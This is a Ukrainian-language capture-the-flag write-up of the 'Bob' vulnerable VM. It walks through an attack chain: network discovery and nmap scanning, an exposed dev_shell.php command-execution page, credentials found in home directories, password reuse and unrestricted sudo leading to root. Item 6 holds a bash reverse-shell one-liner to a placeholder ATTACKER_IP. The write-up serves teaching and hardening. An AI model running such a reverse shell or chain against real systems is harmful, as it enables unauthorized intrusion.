Опис вразливостей CTF VM Bob
CTF VM демонструє ланцюжок класичних помилок конфігурації та безпеки, що дозволяють атакувальнику пройти шлях від мережевої розвідки до повного root-доступу.

1️⃣ Відсутність мережевої сегментації та захисту від розвідки
Опис: Цільова віртуальна машина безперешкодно виявляється у локальній мережі за допомогою netdiscover.

Прояв:
```bash
sudo netdiscover -r 192.168.56.0/24
```
Проблема:

Відсутній Network Segmentation
Немає IDS/IPS або ARP-monitoring
Відсутній контроль ARP-запитів
Наслідок: Зловмисник легко ідентифікує ціль для подальшої атаки.

2️⃣ Надмірно відкрита поверхня атаки (Attack Surface)
Опис: Сервіси доступні без додаткових обмежень або фільтрації.

Прояв:

HTTP доступний без обмежень
SSH доступний (хоч і на нестандартному порту)
Проблема:

Відсутній firewall (iptables / ufw)
Відсутній rate limiting
Security through obscurity (зміна порту SSH ≠ захист)
Наслідок: Можливість повного сервісного перерахування через nmap.

3️⃣ Розкриття інформації через розширене сканування Nmap
Опис: Сканування -sC -sV -p- успішно розкриває всі активні сервіси та їх конфігурації.

Проблема:

Відсутній IDS/IPS
Відсутній контроль Nmap NSE-скриптів
Сервіси відповідають повною інформацією про версії
Наслідок: Полегшує підбір експлойтів та вразливих компонентів.

4️⃣ Розкриття внутрішньої структури вебзастосунку
Опис: Файл robots.txt містить посилання на чутливі внутрішні ресурси.

Прояв:

**/dev_shell.php**

Проблема:

robots.txt використовується як “security control”
Відсутній access control
Наслідок: Прямий доступ до небезпечного функціоналу.

5️⃣ Небезпечний debug / development endpoint
Опис: dev_shell.php дозволяє виконувати системні команди через веб-інтерфейс.

Прояв:
```bash
id
whoami
pwd
```
Проблема:

Remote Command Execution (RCE)
Відсутня автентифікація
Відсутня фільтрація вводу
Наслідок: Повний контроль над системою від імені www-data.

6️⃣ Відсутність обмежень на виконання команд (RCE)
Опис: Через dev_shell.php можливо виконати bash reverse shell.

Прояв:
```sh
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```
Проблема:

Відсутній AppArmor / SELinux
Відсутній command sandboxing
Наслідок: Інтерактивний shell на сервері.

7️⃣ Розкриття облікових даних у домашніх каталогах
Опис: У домашніх каталогах користувачів зберігаються файли з паролями у відкритому вигляді.

Прояв:
```text
.old_passwordfile.html
theadminisdumb.txt
```
Проблема:

Відсутні file permissions hygiene
Відсутня політика зберігання секретів
Наслідок: Credential harvesting → lateral movement.

8️⃣ Повторне використання паролів (Password Reuse)
Опис: Отримані паролі використовуються для:

входу під іншими користувачами
розшифрування GPG-файлів
доступу до SSH / su
Проблема:

Відсутня password hygiene
Відсутня MFA
Наслідок: Швидке розширення доступу.

9️⃣ Небезпечне зберігання секретів у GPG-файлі
Опис: Файл login.txt.gpg зашифрований, але парольна фраза зберігається поруч у notes.sh.

Проблема:

Base64 / GPG використовується без threat model
Passphrase hardcoded у файлі
Наслідок: Ілюзія безпеки → повна компрометація.

🔟 Відсутність принципу найменших привілеїв (Least Privilege)
Опис: Користувач bob має повні root-права через sudo.

Прояв:
```sh
sudo -l
```
Проблема:

ALL=(ALL) ALL
Відсутній role separation
Наслідок: Миттєве підвищення привілеїв.

1️⃣1️⃣ Критична помилка конфігурації sudo
Опис: sodu налаштований без обмежень для звичайного користувача.

Проблема:

Відсутні NOPASSWD-обмеження
Відсутній command allow-list
Відсутній logging
Наслідок: Повна компрометація системи.

Загальний висновок
Ця CTF VM демонструє реалістичний attack chain:

Network discovery → Web RCE → Credential harvesting → Password reuse → Privilege escalation → Root compromise
